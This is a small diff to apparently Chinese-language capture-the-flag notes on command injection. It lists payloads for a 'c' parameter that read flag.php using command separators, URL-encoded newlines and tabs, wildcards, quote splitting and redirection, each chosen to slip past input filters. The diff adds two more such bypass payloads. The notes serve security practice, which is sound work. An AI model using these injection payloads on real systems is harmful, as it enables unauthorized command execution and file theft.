@@ -178,4 +178,6 @@ c=cat flag.php; //;是用来分割命令的
 c=nl flag.php%0a //%0a是换行符
 c=tac flag.php|| // ||连接2个命令，如果前面一个命令执行成功，就不执行后一个命令
 c=tac%09fl*g.php%0a //%09是tab键
+c=tac%09fl?g.php%0a
+c=tac<fla''g.php|| //<是重定向符
 ```
